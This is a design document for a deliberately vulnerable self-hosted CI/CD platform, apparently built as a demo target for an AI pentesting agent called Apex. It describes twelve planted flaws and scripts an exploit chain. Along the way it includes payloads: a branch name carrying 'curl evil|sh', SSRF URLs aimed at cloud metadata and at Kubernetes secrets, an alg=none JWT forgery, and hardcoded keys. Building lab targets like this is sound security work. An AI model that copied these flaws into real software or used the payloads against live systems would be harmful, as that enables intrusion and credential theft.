# PipelineIQ — Ship Code, Not Incidents
### A Drone/Buildkite-style CI/CD platform with a Connect-go control plane, Kubernetes runner fleet, and a React dashboard developers actually want to live in.

---

## Premise & Vibe

PipelineIQ is the kind of self-hosted CI/CD product a 60-engineer Series B SaaS company would adopt after they outgrow GitHub Actions but can't justify the price tag of CircleCI Enterprise. The pitch on the marketing site reads: "Declarative pipelines. Ephemeral runners. Receipts for every artifact." The product is targeted at platform engineers who want a YAML-defined pipeline model, fast logs, and a clean secret store, without the ceremony of Tekton.

The vibe is serious devtools. Dark UI, monospace logs, minimal chrome, lots of `kubectl`-flavored jargon. Marketing pages talk about "build-graph DAGs", "supply-chain provenance", and "policy-as-code". The dashboard has a swimlane view of runners, a pipeline visualizer, a secrets vault tab, and a GitHub-style webhook integration page. Engineers look at this and say: yes, this is real, I've written tickets against this.

Underneath, PipelineIQ is the perfect canvas for an Apex demo. CI/CD systems sit at the intersection of three of the juiciest attack surfaces in the modern stack: webhooks (SSRF), secret stores (token theft), and runner sandboxes (RCE-by-design). Every ergonomic compromise the platform team made — "let users template `$BRANCH` into shell steps", "let the runner pull arbitrary container images", "let webhook URLs be any URL" — is a real-world bug we have logs for.

Apex's job in the demo is to walk through PipelineIQ the way a determined supply-chain attacker would: get a foothold via a webhook, exfil a secret, pivot through the runner network, and show the operator getting cluster-admin on the kind cluster.

## Why This Stack

The stack is chosen to mirror what real platform teams ship in 2025–2026:

- **Go 1.23 + Connect-go** is the dominant pattern for new control planes. Connect-go gives you gRPC, gRPC-Web, and a REST/JSON gateway from one `.proto` definition, which is exactly how Buildkite, Dagger, and Earthly structure their APIs. It also lets us showcase `/pentest` reasoning over both gRPC reflection and REST routes in the same target.
- **PostgreSQL + Redis** is the boring-correct choice. Postgres holds pipelines, secrets, orgs, users; Redis is the job queue and the live-log fanout.
- **React 19 + TypeScript** for the dashboard. Server Components are off — this is an SPA against the Connect gateway, which is realistic for tools where the SPA needs a websocket-y log stream.
- **Kubernetes (kind locally)** is non-negotiable for a CI demo. The runner fleet lives as Pods. We get container-escape and RBAC pivots for free.
- **Runner agent over gRPC + mTLS** mirrors how Buildkite Agent and GitLab Runner actually work — long-poll for jobs, stream logs back, upload artifacts. mTLS for runners is the modern best practice; JWT for humans is the modern best practice. We will then quietly break both.

The stack is also Apex-friendly. Connect-go's reflection support means `/pentest` can enumerate methods. Postgres + a real ORM means the finding-judge can distinguish blind SQLi from a logged error. The runner agent connecting outbound to the control plane is the perfect substrate for `/operator` to pivot agent → control-plane → cluster.

## Stack Details

| Layer | Choice | Notes |
|---|---|---|
| Language (control plane) | Go 1.23 | `connectrpc.com/connect` v1.16, `connectrpc.com/grpcreflect` |
| Language (runner agent) | Go 1.23 | Same connect-go client; long-polls `RunnerService.LeaseJob` |
| API transport | gRPC + Connect REST gateway on `:8080` | gRPC reflection ENABLED in prod (intentional) |
| DB | PostgreSQL 16 | `sqlc` for queries, `pgx/v5` driver, `golang-migrate` |
| Queue / pubsub | Redis 7 | Jobs queue + per-job log channel |
| Frontend | React 19 + TS 5.6 + Vite 6 | TanStack Router, Connect-Web client, xterm.js for logs |
| Build orchestrator | Custom; jobs scheduled into `kind` cluster | Pods are `pipelineiq/runner-pod:latest` |
| Object storage | MinIO (S3-compatible) | Artifacts and cached layers |
| Secret store | Postgres `secrets` table, AES-GCM with a single static key (intentional) | No envelope encryption, no KMS |
| Auth (humans) | JWT HS256, 24h | Issued by `AuthService.Login` |
| Auth (runners) | mTLS, intermediate CA per-org | Plus a fallback bootstrap JWT (intentional weakness) |
| Webhook ingress | `POST /v1/webhooks/github/{org_slug}` | HMAC-SHA256 verification (intentionally type-loose) |
| Container | `cgr.dev/chainguard/go` base for control plane; `ubuntu:22.04` for runner pod | Runner pod runs `--privileged` (intentional) |
| Local infra | `kind` 1-control + 2-worker, MetalLB, ingress-nginx | Single `make demo-up` |

## Architecture

```
                  ┌─────────────────────────────────────────────────┐
                  │                 React 19 SPA                    │
                  │  /dashboard /pipelines /secrets /webhooks       │
                  └─────────────────┬───────────────────────────────┘
                                    │  Connect-Web (HTTP/1.1+JSON)
                                    ▼
   GitHub webhooks ───────►  ┌──────────────────────────┐
   POST /v1/webhooks/...     │  pipelineiq-api (Go)     │
                             │  Connect-go on :8080     │
                             │  gRPC + REST gateway     │
                             │  gRPC reflection: ON     │
                             └──┬─────────────┬─────────┘
                                │             │
                       sqlc /pgx│             │mTLS over HTTP/2
                                ▼             │
                       ┌─────────────┐        │
                       │ PostgreSQL  │        │
                       │ 16          │        │
                       └─────────────┘        │
                                              │
                       ┌─────────────┐        ▼
                       │ Redis 7     │◄───┐  ┌──────────────────────────┐
                       │ jobs: list  │    │  │ pipelineiq-runner (Go)   │
                       │ logs: pubsub│    └─►│ in Pod, --privileged     │
                       └─────────────┘       │ LeaseJob / StreamLogs    │
                                             └──────────┬───────────────┘
                                                        │ docker.sock from host
                                                        ▼
                                                  ┌──────────────┐
                                                  │ kind cluster │
                                                  │ kube-apiserver│
                                                  └──────────────┘
```

Three Go binaries:

1. **`pipelineiq-api`** — the control plane. Serves Connect-go on `:8080`. Owns Postgres, Redis, the webhook receiver, the auth flow, and the runner-facing gRPC.
2. **`pipelineiq-runner`** — the in-cluster agent. Long-polls `LeaseJob`, pulls a container image, runs the steps, streams logs back via `StreamLogs` (client-streaming RPC).
3. **`pipelineiq-web`** — Vite-built static SPA, served from a Caddy sidecar.

Pipelines are YAML. A pipeline run lives through states `queued → leased → running → succeeded|failed|cancelled`. Logs are written to Redis pubsub `logs:{run_id}:{step_id}`, and persisted to Postgres `step_logs` after step completion. The SPA subscribes to logs over a Connect server-streaming RPC `RunService.WatchLogs`.

## Data Model

```
orgs(id, slug, name, plan, created_at)
users(id, email, password_hash, created_at)
org_members(org_id, user_id, role)        -- role: owner|admin|developer|viewer

pipelines(id, org_id, name, repo_url, default_branch, yaml_source, created_by, created_at)
pipeline_runs(id, pipeline_id, commit_sha, branch, trigger, status, started_at, finished_at)
steps(id, run_id, idx, name, image, script, status, exit_code)
step_logs(id, step_id, seq, stream, line, created_at)   -- stream: stdout|stderr

secrets(id, org_id, pipeline_id NULL, name, ciphertext, nonce, created_by, created_at)
   -- pipeline_id NULL means org-scoped; non-null means pipeline-scoped
   -- ciphertext is AES-GCM(KEY=hardcoded, plaintext); KEY lives in env PIPELINEIQ_SECRET_KEY
   -- defaults to "dev-do-not-use-in-prod-0000000000" if env var missing (it's missing in prod)

webhooks(id, org_id, pipeline_id, kind, url, hmac_secret, last_status, created_at)
   -- kind: github_inbound | outbound_notify
   -- url is user-controllable for outbound_notify (SSRF surface)

runners(id, org_id, name, cert_fingerprint, last_seen, version, labels JSONB)
runner_tokens(id, runner_id, jwt_id, issued_at, revoked_at)
   -- JWTs signed with hardcoded HS256 key "pipelineiq-runner-dev-key" (intentional)

audit_log(id, org_id, actor_user_id, action, target_type, target_id, ip, ua, created_at)
```

A few notable design choices that become bugs:

- `secrets.ciphertext` uses a process-local AES-GCM key from `PIPELINEIQ_SECRET_KEY`. The Helm chart and Dockerfile never set it, so production silently uses the dev fallback string in the binary. This is the "no envelope encryption" finding.
- `webhooks.url` for outbound notifications is fetched server-side with no SSRF allowlist. This is one of the SSRF sinks.
- `runner_tokens` exists as a "bootstrap" path even though mTLS is the documented happy path. The hardcoded HS256 key is shipped in the runner container image.

## Key Routes / Surfaces

The Connect-go service has three protos: `auth/v1`, `core/v1`, and `runner/v1`. Connect exposes each method at both gRPC and REST.

### gRPC services & methods

| Service | RPC | gRPC Path | REST gateway | Auth |
|---|---|---|---|---|
| `auth.v1.AuthService` | `Login` | `/auth.v1.AuthService/Login` | `POST /v1/auth/login` | none |
| `auth.v1.AuthService` | `Refresh` | `/auth.v1.AuthService/Refresh` | `POST /v1/auth/refresh` | JWT |
| `auth.v1.AuthService` | `WhoAmI` | `/auth.v1.AuthService/WhoAmI` | `GET /v1/auth/me` | JWT |
| `core.v1.OrgService` | `ListOrgs` | `/core.v1.OrgService/ListOrgs` | `GET /v1/orgs` | JWT |
| `core.v1.OrgService` | `GetOrg` | `/core.v1.OrgService/GetOrg` | `GET /v1/orgs/{id}` | JWT |
| `core.v1.PipelineService` | `ListPipelines` | `/core.v1.PipelineService/ListPipelines` | `GET /v1/orgs/{org}/pipelines` | JWT |
| `core.v1.PipelineService` | `GetPipeline` | `/core.v1.PipelineService/GetPipeline` | `GET /v1/pipelines/{id}` | JWT |
| `core.v1.PipelineService` | `CreatePipeline` | `/core.v1.PipelineService/CreatePipeline` | `POST /v1/pipelines` | JWT |
| `core.v1.PipelineService` | `UpdatePipelineYAML` | `/core.v1.PipelineService/UpdatePipelineYAML` | `PUT /v1/pipelines/{id}/yaml` | JWT |
| `core.v1.PipelineService` | `FetchExternalPipeline` | `/core.v1.PipelineService/FetchExternalPipeline` | `POST /v1/pipelines/import` | JWT |
| `core.v1.RunService` | `TriggerRun` | `/core.v1.RunService/TriggerRun` | `POST /v1/pipelines/{id}/runs` | JWT |
| `core.v1.RunService` | `GetRun` | `/core.v1.RunService/GetRun` | `GET /v1/runs/{id}` | JWT |
| `core.v1.RunService` | `WatchLogs` | `/core.v1.RunService/WatchLogs` | `GET /v1/runs/{id}/logs/stream` (SSE) | JWT |
| `core.v1.SecretService` | `ListSecrets` | `/core.v1.SecretService/ListSecrets` | `GET /v1/pipelines/{id}/secrets` | JWT (broken — see vulns) |
| `core.v1.SecretService` | `PutSecret` | `/core.v1.SecretService/PutSecret` | `POST /v1/pipelines/{id}/secrets` | JWT |
| `core.v1.SecretService` | `RevealSecret` | `/core.v1.SecretService/RevealSecret` | `GET /v1/pipelines/{id}/secrets/{name}/reveal` | JWT |
| `core.v1.WebhookService` | `RegisterOutbound` | `/core.v1.WebhookService/RegisterOutbound` | `POST /v1/webhooks/outbound` | JWT |
| `core.v1.WebhookService` | `TestOutbound` | `/core.v1.WebhookService/TestOutbound` | `POST /v1/webhooks/outbound/{id}/test` | JWT |
| `runner.v1.RunnerService` | `Register` | `/runner.v1.RunnerService/Register` | n/a (gRPC only) | mTLS or bootstrap JWT |
| `runner.v1.RunnerService` | `LeaseJob` | `/runner.v1.RunnerService/LeaseJob` | n/a | mTLS or bootstrap JWT |
| `runner.v1.RunnerService` | `StreamLogs` | `/runner.v1.RunnerService/StreamLogs` (client streaming) | n/a | mTLS or bootstrap JWT |
| `runner.v1.RunnerService` | `ReportResult` | `/runner.v1.RunnerService/ReportResult` | n/a | mTLS or bootstrap JWT |

### Non-RPC surfaces

| Surface | Path | Notes |
|---|---|---|
| GitHub inbound webhook | `POST /v1/webhooks/github/{org_slug}` | HMAC-SHA256, type-coerced (vuln) |
| Health | `GET /healthz` | k8s probe |
| Metrics | `GET /metrics` | Prometheus, world-readable |
| gRPC reflection | `grpc.reflection.v1.ServerReflection/*` | Enabled in prod (vuln) |
| SPA | `GET /` | Caddy sidecar |

## Auth Model

There are two authn worlds in PipelineIQ.

**Humans** authenticate at `AuthService.Login` with email + password. The server returns an HS256 JWT, signed with `PIPELINEIQ_JWT_SECRET` (a real per-deployment env var, set correctly), with claims `{sub: user_id, orgs: [...], exp}`. Tokens are 24h. The SPA stores tokens in `localStorage` (sigh, but typical) and includes `Authorization: Bearer ...` on every Connect call. Authorization is enforced by an interceptor that loads `org_members` and attaches role to context. Routes then check role.

**Runners** are supposed to use mTLS. The control plane is fronted by an in-process TLS listener on `:8443` with `ClientAuth: VerifyClientCertIfGiven`. Per-org intermediate CAs are issued at runner registration. The runner agent presents its cert on every gRPC call; an interceptor pulls the SAN, looks up the runner, and attaches the runner identity.

There is also a "bootstrap" path: `RunnerService.Register` accepts a JWT in metadata when no client cert is presented, signed with HS256 key `pipelineiq-runner-dev-key`, claim `{purpose: "bootstrap", org_id}`. The intent was: a brand-new runner Pod uses the bootstrap JWT once to obtain a client cert. The bug: nothing forces re-issuance after first use, the key is hardcoded and shipped in the runner image, and `Register` is not the only RPC that accepts the bootstrap JWT — `LeaseJob` and `StreamLogs` also do, because the auth interceptor does `if cert == nil { try jwt }` for all runner methods.

GitHub webhook auth is HMAC-SHA256 over the request body with `webhooks.hmac_secret`. Verification is implemented as:

```go
if subtle.ConstantTimeCompare([]byte(provided), []byte(expected)) == 1 { ... }
// where provided is r.Header.Get("X-Hub-Signature-256")
// the bug: provided is parsed as `sha256=<hex>`, but the hex is
// converted with strconv.Atoi-like coercion in a helper that
// trims trailing whitespace AND a single trailing newline before compare.
```

Effectively: appending a `\n` (or sometimes leading garbage that the parser's loose trim eats) makes signatures match across orgs. PHP-style "loose comparison after trim" lives on in Go too. (Inspired by real-world Twitter webhook signature CVEs and the `secure_compare` foot-guns in Ruby.)

## Intentional Vulnerabilities

Twelve planted bugs, distributed across CVSS severities. Each maps to a real CVE or bounty.

| # | Severity | Class | Location | Real-world parallel |
|---|---|---|---|---|
| 1 | Critical | RCE via build config command injection | `runner/exec/shell.go` — `$BRANCH_NAME` interpolated unquoted into `bash -c` | Bitbucket Pipelines branch-name injection (HackerOne #1268113-style); GitLab CVE-2022-2185 |
| 2 | Critical | Container escape from privileged runner | `runner-pod.yaml` sets `securityContext.privileged: true` and mounts `/var/run/docker.sock` | runc CVE-2019-5736; Argo Workflows CVE-2022-29164 |
| 3 | Critical | Hardcoded HS256 key for runner JWT | `internal/runner/auth.go: bootstrapKey = "pipelineiq-runner-dev-key"` | CVE-2022-39349 (Argo CD), CVE-2024-27316 — class of "dev key in prod" |
| 4 | Critical | SSRF to cloud metadata via outbound webhook | `WebhookService.TestOutbound` fetches user URL with no allowlist | CVE-2017-12839 (Capital One-style metadata exfil), HackerOne reports against Shopify, GitLab CVE-2021-22214 |
| 5 | High | SSRF to internal Kubernetes API via FetchExternalPipeline | `PipelineService.FetchExternalPipeline` resolves DNS server-side; `kubernetes.default.svc` reachable | GitLab CVE-2021-22214; Grafana CVE-2022-31097 (datasource SSRF) |
| 6 | High | Secrets stored without envelope encryption / hardcoded fallback key | `internal/secrets/store.go` uses `PIPELINEIQ_SECRET_KEY` env, falls back to literal in code | Vault-by-not-Vault: CircleCI 2023 incident lessons; CVE-2023-2825 (GitLab) class |
| 7 | High | gRPC reflection enabled in prod | `cmd/api/main.go: grpcreflect.NewStaticReflector(...)` always registered | CVE-2024-26602 class; Sysdig "gRPC reflection in prod" 2023 writeups |
| 8 | High | IDOR on `/v1/pipelines/{id}/secrets` | Handler checks `JWT.user_id has any org` but not `org_id == pipeline.org_id` | HackerOne #1399811 (Shopify cross-shop secrets); GitLab CVE-2023-3401 |
| 9 | High | Weak HMAC verification on GitHub webhooks (type-coerced compare) | `internal/webhooks/github.go: verifySig()` trims newline before compare | CVE-2022-23529 (jsonwebtoken type confusion class); Rack signature bypass class |
| 10 | Medium | Secret leak in build logs via `set -x` default | `runner/exec/shell.go: prelude = "set -ex\n"` echoes env | CVE-2019-1003049 (Jenkins env echo); class of "Travis CI env echo" |
| 11 | Medium | JWT `alg=none` accepted on refresh endpoint | `internal/auth/jwt.go: Verify()` switches on header alg, no allowlist | CVE-2015-9235 (jsonwebtoken alg=none); CVE-2018-0114 (Cisco) |
| 12 | Low | Open metrics endpoint exposes pipeline names + run IDs | `/metrics` includes `pipeline_runs_total{pipeline="acme/payments-prod"}` | Class: GitLab metrics exposure (CVE-2021-39867); CNCF Prom guidance |

Notes on each, for the engineer scaffolding:

1. **Command injection.** In `runner/exec/shell.go`, the shell prelude is rendered with `fmt.Sprintf` interpolating commit metadata directly: `script = preamble + "\n" + step.Script`, where `preamble` includes `export BRANCH_NAME=%s` with `%s = run.Branch`. A branch named `"x;curl evil|sh;#"` is enough. The runner-side judge surfaces this as a real RCE because the resulting shell is the runner's, not a sandbox.

2. **Privileged runner.** In `deploy/k8s/runner-pod.yaml`, `securityContext.privileged: true` and `volumeMounts: /var/run/docker.sock`. Combined with #1, an attacker pivots to the host. Apex's finding-judge should distinguish this from #1: same root cause for foothold, separate CVSS chain.

3. **Hardcoded runner key.** `bootstrapKey` is a `const string` in `internal/runner/auth.go`. Anyone who pulls `pipelineiq/runner-pod:latest` (which is publicly listed in the docs) can mint a runner JWT for any org. Apex must reach this via supply-chain reasoning ("the image is public, let's strings it").

4. **SSRF to metadata.** `WebhookService.TestOutbound` runs `http.Get(url)` with the standard library, no SSRF guard, follows redirects, no DNS rebind protection. `http://169.254.169.254/latest/meta-data/iam/security-credentials/` exfils a role token in the response body, which the UI conveniently displays back as "test result preview".

5. **SSRF to k8s.** `PipelineService.FetchExternalPipeline` accepts `repo_url` and does `http.Get(repo_url + "/.pipelineiq.yaml")`. Cluster-internal DNS is resolvable: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`. With the runner's service-account token mounted in the API pod (intentional misconfig — `automountServiceAccountToken: true` and a too-broad ClusterRole binding), this returns secrets. The judge needs to distinguish the no-auth 401 case from the actual readable case.

6. **Secrets at rest.** Postgres `secrets.ciphertext` uses AES-GCM with a process key. The Helm chart's `values.yaml` does not set `PIPELINEIQ_SECRET_KEY`. The Go code logs `WARN: using fallback secret key` once at startup; nobody ever sees the warning. With Postgres read access (#8), all secrets decrypt with the key strings'd from the public binary.

7. **gRPC reflection.** `cmd/api/main.go` always registers `grpcreflect.NewStaticReflector` for all services. `/pentest` enumerates methods, including the runner-only ones, just by hitting `:8080`. This makes the IDOR (#8) and SSRF (#4, #5) trivially discoverable.

8. **IDOR on secrets.** The interceptor populates `ctx.UserOrgs`. The handler checks `pipeline.OrgID in ctx.UserOrgs`. The handler's first 3 lines are correct. But `RevealSecret` skips the check entirely and only verifies that the *user is logged in*, on the theory "if you can list, you can reveal". Cross-org direct access by ID returns plaintext.

9. **HMAC verification.** Real bug shape: `verifySig` calls `strings.TrimSpace(provided)` before `subtle.ConstantTimeCompare`. Attacker controls `X-Hub-Signature-256: sha256=<hex>\n` which trims to a value that can be made to compare equal to a precomputed hex prefix the attacker already has from a prior leaked webhook delivery. This is a believable, type-loose-compare style bug rather than "we forgot to verify".

10. **Logs leak secrets.** Runner shell prelude is `set -ex\n` plus `export FOO=$FOO_FROM_SECRETS`. With `set -x`, every export is echoed. The control plane stores the stream verbatim. Anyone with `step_logs` read access (which includes "viewer" role on the org) can see secrets that were used in any prior build.

11. **JWT alg=none.** `Verify` does `switch header.Alg { case "HS256": ...; case "none": return claims, nil; }`. Plant this as an early-development "for tests" branch that survived. The refresh endpoint specifically calls a thin wrapper that uses `Verify`, while `Login`'s issuance correctly always picks HS256. So forge-a-refresh works; forge-an-access-token only works on `Refresh`.

12. **Metrics exposure.** `/metrics` is on the same listener and not behind auth. Labels include `pipeline="<org_slug>/<pipeline_name>"`, plus per-run histograms keyed by `run_id`. Gives an attacker an org/pipeline namespace to enumerate.

## Real-World Parallels

- The runner-pod-privileged + docker.sock pattern was the root cause of the **TeamCity 2024** and **Argo Workflows 2022** escape disclosures. The kind cluster makes this safe to demo.
- **Capital One's 2019 breach** is the canonical instance-metadata SSRF; we're recreating it on a CI surface, where the equivalent of "WAF accepts arbitrary upstream URL" is "webhook accepts arbitrary upstream URL".
- **GitLab CVE-2021-22214** is the CI-import SSRF that maps almost exactly to `FetchExternalPipeline`.
- **CircleCI's January 2023 incident** taught the industry that secret-store keys not stored in a KMS are one stolen laptop away from total compromise. We model that with the hardcoded fallback key.
- **HackerOne #1268113** (Bitbucket Pipelines branch-name injection) is the most direct parallel to the `$BRANCH_NAME` shell injection.
- **CVE-2024-26602**-class findings around gRPC reflection in production motivate showing Apex auto-discovering RPCs.
- **`jsonwebtoken` alg=none CVE-2015-9235** is the canonical JWT bypass; we replicate the bug rather than the library.

## Apex Features Showcased

PipelineIQ is built to make six Apex capabilities legible on camera.

1. **`/pentest` blackbox + whitebox.** The first run is blackbox (just the URL). Apex finds the SPA, enumerates the Connect REST routes, tries gRPC reflection, and discovers `runner.v1.RunnerService` even though it's never linked from the frontend. Then we re-run with `--source ./pipelineiq-api` and Apex picks up the hardcoded keys, the `set -x` prelude, the alg=none branch.
2. **Supply-chain awareness.** Apex notices `pipelineiq/runner-pod:latest` referenced in docs, pulls it, runs `strings`, finds `pipelineiq-runner-dev-key`, and chains it to forging a runner JWT. This is the moment the demo says "Apex is not just a fuzzer".
3. **Finding-judge in action.** When the shell-injection PoC runs `id`, the runner is in a container — output is `uid=0(root) groups=0(root)`. The judge has to decide: is this a sandbox or the host? It then runs `cat /proc/1/cgroup` and compares; once it sees the runner is privileged with docker.sock, it upgrades the finding from "RCE-in-sandbox (High)" to "RCE-with-host-pivot (Critical)" and writes a separate finding for the runner config.
4. **`/operator` pivoting.** After foothold on a runner, `/operator` notices the mounted SA token, queries `kubernetes.default.svc`, finds it has `secrets get` cluster-wide, dumps secrets, and finally moves laterally to the API pod. The agent network view shows three sub-agents: `webhook-recon`, `runner-foothold`, `cluster-pivot`.
5. **Swarm dashboard.** Recon, exploit, and judge sub-agents run in parallel. The visual is: the React-style swimlane in Apex's TUI, ticking through findings, with the judge merging/dedup'ing.
6. **Threat-model + attack-surface.** Pre-run, Apex generates a STRIDE-ish threat model from the proto files and the Helm chart. It calls out "webhook URL is user-controllable, no SSRF guard observed in code" as a hypothesis before any runtime testing.

## Demo Storyline

A 9–11 minute video, four acts.

**Act 1 — Setup (90s).** Engineer narrates: "PipelineIQ is our self-hosted CI." Tour of dashboard: a few pipelines, a green run, the secrets tab, the webhooks page. Make it look loved-in. Cut to terminal: `apex /pentest https://pipelineiq.demo.local`.

**Act 2 — Recon to first finding (2.5 min).** Apex runs attack-surface and threat-model. Camera lingers on the threat-model output flagging webhook SSRF. Apex hits gRPC reflection (#7), enumerates `RunnerService` methods, notes "this surface is supposed to be runner-only — possible privilege boundary issue". `/operator` triggers an SSRF probe at `WebhookService.TestOutbound` against `169.254.169.254` (#4). Finding #1 lands. Critical.

**Act 3 — Pivots and the judge moment (4 min).** Apex chains:
- HMAC bypass (#9) on `/v1/webhooks/github/{org_slug}` to inject a synthetic push event.
- The push triggers a real run on a pipeline that has `$BRANCH_NAME` in a shell step (#1).
- The exploit branch name pops a shell on the runner.
- Judge does its thing: distinguishes sandbox from host, escalates to #2 (privileged runner / container escape).
- `/operator` walks the runner's mounted SA token to the kube API (#5 already known to be reachable; now exploited from inside).
- Cluster-admin secrets dump.
- Apex grabs `pipelineiq-api`'s `PIPELINEIQ_JWT_SECRET` from cluster secrets, mints an admin JWT, and shows the cross-org IDOR (#8) is now trivial.

**Act 4 — Whitebox sweep & report (2 min).** Re-run `/pentest --source`. Apex finds the additional bugs: alg=none (#11), set -x leak (#10), hardcoded fallback secret key (#6), hardcoded runner JWT key (#3 — confirmed against the supply-chain finding from Act 2), metrics leak (#12). Final findings registry shows 12 findings, CVSS-scored, with PoCs and patch suggestions. Patching agent runs on three of them and opens a PR against the `pipelineiq` repo.

## Build Notes

Target build effort: 3–5 days for one engineer comfortable with Go and React.

**Day 1 — Skeleton.**
- `go mod init`, scaffold `cmd/api`, `cmd/runner`, `internal/...`.
- Write `proto/auth/v1/*.proto`, `proto/core/v1/*.proto`, `proto/runner/v1/*.proto`. `buf generate`.
- Postgres schema + `sqlc generate`. Seed: 2 orgs (`acme`, `globex`), 4 pipelines, 2 users per org.
- Connect-go server boilerplate. JWT interceptor. mTLS listener on `:8443`.
- `make demo-up`: docker-compose for Postgres+Redis, kind for runner.

**Day 2 — Runner + pipeline execution.**
- Runner agent: `LeaseJob`, `StreamLogs` client streaming, `ReportResult`.
- Shell executor in runner that renders the YAML pipeline. Implement #1 and #10 here.
- Helm chart for runner Pod with `privileged: true` and docker.sock mount (#2). Add a comment: `# TODO: harden — needed for buildkit cache`. The TODO comment is part of the realism.
- Hardcoded `bootstrapKey` (#3) in `internal/runner/auth.go`.

**Day 3 — Webhooks + secrets + IDOR.**
- GitHub webhook receiver with the type-loose verify (#9).
- `WebhookService.TestOutbound` (#4), `PipelineService.FetchExternalPipeline` (#5). No SSRF guard.
- `SecretService` with the IDOR shape (#8) and the fallback-key bug (#6). Add a startup `slog.Warn` for the fallback that no operator dashboard surfaces.
- `/metrics` exposed unauth (#12).

**Day 4 — SPA + JWT bug.**
- React 19 SPA: dashboard, pipeline detail, secrets vault, webhooks page. xterm.js for live logs. Use Tailwind v4 if you must, or vanilla CSS modules — whatever ships fast.
- Auth flow with the alg=none branch (#11) only on `Refresh`.
- Make the dashboard look real: charts of run durations, a swimlane of runners, a recent-activity feed.

**Day 5 — Polish & make it demo-able.**
- Seed realistic data: 50 historical runs, mixed success/fail, real-looking commit messages.
- Public-facing marketing-ish landing page at `/` if not authed (helps the camera).
- Add the runner-pod image to a local registry mirror so the supply-chain demo is reproducible offline.
- Smoke-test all 12 vulns end-to-end with curl/`apex` against the live target.
- Write a `vulns.md` *for ourselves* (not shipped) with PoC commands per finding so the recording engineer can sanity-check.

**Hardening kept on (so the bugs are believable):**
- Passwords are bcrypt'd. Login is rate-limited.
- SQL is `sqlc` with parametrized queries (so we are NOT planting SQLi — that would be off-tone).
- CORS is correctly restricted to the SPA origin.
- TLS terminates at the ingress with a real cert.
- Audit log is written for every mutation. (Apex will use it as a corroborating signal in the report.)
- Frontend uses `Trusted Types` and a strict CSP. We are not interested in XSS theater.

The point is: this should look like a team that did most things right and made a small number of plausible mistakes — not a CTF box.

**Repository layout (target):**

```
pipelineiq/
├── cmd/
│   ├── api/main.go            # control plane entrypoint
│   └── runner/main.go         # runner agent entrypoint
├── proto/
│   ├── auth/v1/auth.proto
│   ├── core/v1/{org,pipeline,run,secret,webhook}.proto
│   └── runner/v1/runner.proto
├── internal/
│   ├── auth/                  # JWT issue/verify (alg=none bug here)
│   ├── runner/                # bootstrap key (hardcoded), mTLS verify
│   ├── secrets/               # AES-GCM with fallback key
│   ├── webhooks/              # GitHub HMAC verify (loose)
│   ├── ssrf/                  # NOT a guard — just an http.Client wrapper
│   ├── exec/                  # shell renderer (cmd injection)
│   ├── kube/                  # client for FetchExternalPipeline
│   └── storage/               # sqlc generated code
├── web/
│   ├── src/
│   │   ├── routes/{dashboard,pipelines,secrets,webhooks,runners}/
│   │   └── lib/connect.ts     # Connect-Web client
│   └── package.json
├── deploy/
│   ├── helm/pipelineiq/       # chart
│   └── k8s/runner-pod.yaml    # privileged + docker.sock (intentional)
├── docs/
│   ├── architecture.md
│   ├── runner-onboarding.md   # docs reference public runner image
│   └── webhook-spec.md
├── Makefile
└── docker-compose.yml
```

**Seed data shape:**

- Org `acme` (slug `acme`, plan `team`) with users `[email protected]` (owner) and `[email protected]` (developer).
- Org `globex` (slug `globex`, plan `enterprise`) with `[email protected]` (owner). Globex owns the secrets we want Apex to exfil cross-org.
- Pipelines: `acme/web`, `acme/api`, `acme/payments-prod`, `globex/billing`, `globex/admin-tools`.
- Globex's `admin-tools` pipeline holds an `AWS_ACCESS_KEY_ID` and `STRIPE_LIVE_KEY` secret. Those are the prize.
- 50+ historical runs spread across pipelines, with realistic commit messages from `git log` of any popular OSS repo, hashed for plausibility.
- One pipeline (`acme/payments-prod`) has a step `deploy.sh "$BRANCH_NAME"` — the injection sink. Past runs all used safe branches like `main`, `release/2026-04`.

## Recording Notes

- **Resolution & font:** 1440p capture, terminal at 16pt JetBrains Mono. The Apex TUI rendering should be readable at 1080p YouTube playback.
- **Pre-stage state:** Reset Postgres + Redis between takes. Have a `make demo-reset` target that re-seeds in <5s. Pre-warm the kind cluster — first-run image pulls kill the pacing.
- **Two-window layout:** Left, Apex TUI + terminal. Right, Chrome with PipelineIQ dashboard. Cut between them as Apex finds things. When the judge upgrades a finding, dwell on the registry view.
- **Narration anchors:**
  - The webhook SSRF moment: "Notice Apex didn't just try `127.0.0.1` — it specifically reached for `169.254.169.254`."
  - The judge moment: "Same exploit. Apex decides this isn't an isolated container. Watch the CVSS go from 8.1 to 9.8."
  - The supply-chain pull: "The runner image is public. Apex pulled it, found the dev key, and is now authenticating as a runner."
- **Don't show:** real cloud credentials. The demo's "instance metadata" should be a faked `169.254.169.254` served by a sidecar container in kind, returning believable but synthetic IAM creds.
- **Pre-record artifacts:** capture the final findings registry as JSON and a printable HTML report. The closing shot is the report scrolling, with the patching agent's PR open in a third tab.
- **Length target:** 9–11 minutes. If it runs long, cut Act 4's whitebox sweep to a montage; the live exploit chain in Act 3 is the keeper.
- **Captions:** burn lower-thirds when Apex names a CVE class. Builds credibility for the security-engineer audience watching on mute.
